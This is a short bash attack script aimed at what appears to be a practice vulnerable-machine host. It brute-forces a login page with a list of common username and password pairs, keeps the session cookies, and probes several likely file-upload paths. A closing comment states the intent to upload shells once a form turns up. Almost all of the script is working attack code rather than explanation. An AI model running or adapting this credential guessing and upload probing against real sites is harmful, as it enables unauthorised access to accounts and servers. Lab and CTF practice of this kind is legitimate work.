#!/bin/bash

URL="http://hackme7.vulnmachines.com:8888"

echo "[*] Testing connection..."
if curl -s -m 5 "$URL/login.php" > /dev/null 2>&1; then
    echo "[+] Server is up!"
    
    # Try common credentials
    echo "[*] Trying common credentials..."
    for user in admin test guest user; do
        for pass in admin password 123456 test guest; do
            echo "Trying $user:$pass"
            curl -X POST "$URL/login.php" \
                -d "username=$user&password=$pass" \
                -c cookies.txt \
                -L -s | grep -i "upload\|dashboard\|welcome" && echo "[+] Success with $user:$pass"
        done
    done
    
    # Try direct access to upload pages
    echo "[*] Trying direct access to upload pages..."
    for page in upload.php admin/upload.php dashboard.php files.php fileupload.php; do
        curl -s -b cookies.txt "$URL/$page" | grep -i "upload" && echo "[+] Found upload at $page"
    done
    
    # If we find an upload form, try uploading shells
    echo "[*] Ready to upload shells when form is found"
else
    echo "[-] Server is down"
fi